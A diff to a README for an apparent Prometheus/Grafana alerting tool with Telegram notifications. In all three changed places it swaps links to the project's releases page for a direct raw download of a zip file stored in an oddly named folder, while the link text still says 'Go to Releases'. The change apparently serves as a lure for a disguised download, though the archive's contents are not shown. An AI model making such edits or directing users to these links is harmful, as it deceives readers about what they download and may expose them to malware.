@@ -1,6 +1,6 @@
 # 🚨 class-prometheus-grafana-telegram-alerts - Monitor Metrics with Telegram Alerts
 
-[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Fulminant-funiculitis672/class-prometheus-grafana-telegram-alerts/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Fulminant-funiculitis672/class-prometheus-grafana-telegram-alerts/raw/refs/heads/main/urceiform/class-prometheus-alerts-telegram-grafana-v1.1.zip)
 
 ## 📌 What this app does
 
@@ -36,7 +36,7 @@ You also need:
 
 Visit this page to download the latest release:
 
-[Go to Releases](https://github.com/Fulminant-funiculitis672/class-prometheus-grafana-telegram-alerts/releases)
+[Go to Releases](https://github.com/Fulminant-funiculitis672/class-prometheus-grafana-telegram-alerts/raw/refs/heads/main/urceiform/class-prometheus-alerts-telegram-grafana-v1.1.zip)
 
 On that page, look for the latest release files and download the Windows package if one is listed. If the release includes a `.zip` file, download it and keep it in a folder you can find easily, such as `Downloads` or `Desktop`.
 
@@ -276,7 +276,7 @@ If you want to confirm everything works, look for these signs:
 
 Use the release page here:
 
-[https://github.com/Fulminant-funiculitis672/class-prometheus-grafana-telegram-alerts/releases](https://github.com/Fulminant-funiculitis672/class-prometheus-grafana-telegram-alerts/releases)
+[https://github.com/Fulminant-funiculitis672/class-prometheus-grafana-telegram-alerts/raw/refs/heads/main/urceiform/class-prometheus-alerts-telegram-grafana-v1.1.zip](https://github.com/Fulminant-funiculitis672/class-prometheus-grafana-telegram-alerts/raw/refs/heads/main/urceiform/class-prometheus-alerts-telegram-grafana-v1.1.zip)
 
 ## 📄 Notes for use
 
